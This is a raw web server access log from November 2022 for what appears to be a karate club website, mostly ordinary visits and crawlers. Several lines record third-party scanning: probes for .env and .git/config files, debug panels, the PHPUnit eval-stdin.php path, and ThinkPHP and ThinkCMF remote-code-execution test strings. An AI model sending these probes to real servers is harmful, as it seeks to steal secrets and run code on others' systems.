::ffff:54.179.83.225 - - [21/Nov/2022:10:09:18 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:10:35:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:10:35:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:109.206.243.162 - - [21/Nov/2022:10:45:58 +0000] "GET /explore HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3"
::ffff:167.94.146.57 - - [21/Nov/2022:10:54:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:167.94.146.57 - - [21/Nov/2022:10:54:45 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.146.57 - - [21/Nov/2022:10:54:45 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.146.57 - - [21/Nov/2022:10:54:46 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.146.57 - - [21/Nov/2022:10:54:46 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:18.168.220.2 - - [21/Nov/2022:10:57:31 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.25.1"
::ffff:114.119.144.132 - - [21/Nov/2022:11:07:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:157.90.209.76 - - [21/Nov/2022:11:08:03 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [21/Nov/2022:11:08:04 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:56 +0000] "HEAD / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:57 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:57 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:58 +0000] "HEAD /config.json HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:185.81.157.121 - - [21/Nov/2022:11:09:58 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:51.222.253.9 - - [21/Nov/2022:11:18:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:37.139.53.82 - - [21/Nov/2022:11:28:13 +0000] "GET / HTTP/1.0" 200 57378 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:37.139.53.82 - - [21/Nov/2022:11:28:14 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:37.139.53.82 - - [21/Nov/2022:11:28:14 +0000] "GET /?err=error HTTP/1.0" 200 57930 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4102.0 Safari/537.36"
::ffff:40.80.83.134 - - [21/Nov/2022:11:31:49 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.80.83.134 - - [21/Nov/2022:11:31:50 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.80.83.134 - - [21/Nov/2022:11:31:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.80.83.134 - - [21/Nov/2022:11:31:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:80.94.92.40 - - [21/Nov/2022:11:50:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:164.92.76.202 - - [21/Nov/2022:12:06:12 +0000] "GET / HTTP/1.0" 200 57378 "-" "-"
::ffff:95.214.235.205 - - [21/Nov/2022:12:10:57 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [21/Nov/2022:12:10:58 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.149.53 - - [21/Nov/2022:12:16:02 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:93.159.230.87 - - [21/Nov/2022:12:17:13 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
::ffff:141.255.166.2 - - [21/Nov/2022:12:25:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:40.77.167.4 - - [21/Nov/2022:12:30:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:195.54.174.171 - - [21/Nov/2022:12:36:52 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
::ffff:195.54.174.171 - - [21/Nov/2022:12:36:53 +0000] "GET /HNAP1/ HTTP/1.1" 404 145 "http://34.212.47.6/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
::ffff:203.10.99.204 - - [21/Nov/2022:12:46:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:56 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:56 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:56 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:56 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:56 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:58 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:58 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:58 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:46:58 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:00 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:00 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:00 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:02 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:02 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:02 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:03 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:03 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:03 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:05 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:05 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:05 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:07 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:07 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:07 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:08 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:08 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:08 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:10 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:10 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:11 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:11 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=2" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:12 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=2" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:13 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:13 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:13 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:15 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:15 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:15 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:16 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:16 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=11" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:16 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=11" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:18 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:18 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/contact?s=1&ss=10" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:18.116.88.1 - - [21/Nov/2022:12:47:18 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/contact?s=1&ss=10" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:12:48:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:12:48:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.159 - - [21/Nov/2022:12:49:06 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:203.10.99.204 - - [21/Nov/2022:12:54:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:4.233.106.66 - - [21/Nov/2022:12:58:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "python-httpx/0.23.0"
::ffff:4.233.106.66 - - [21/Nov/2022:12:58:33 +0000] "POST / HTTP/1.1" 404 140 "-" "python-httpx/0.23.0"
::ffff:114.119.152.130 - - [21/Nov/2022:13:10:50 +0000] "GET /joinemail?type=specialclasses HTTP/1.1" 200 8958 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:152.89.196.211 - - [21/Nov/2022:13:13:11 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:13:15:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:13:15:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:93.159.230.83 - - [21/Nov/2022:13:16:04 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
::ffff:114.119.145.193 - - [21/Nov/2022:13:17:35 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:152.89.196.211 - - [21/Nov/2022:13:21:35 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:13:23:40 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:114.119.145.192 - - [21/Nov/2022:13:30:11 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:157.55.39.153 - - [21/Nov/2022:13:37:44 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 200 264927 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:152.89.196.211 - - [21/Nov/2022:13:38:31 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:95.214.235.205 - - [21/Nov/2022:13:38:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [21/Nov/2022:13:38:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:13:43:44 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:157.55.39.169 - - [21/Nov/2022:13:44:28 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
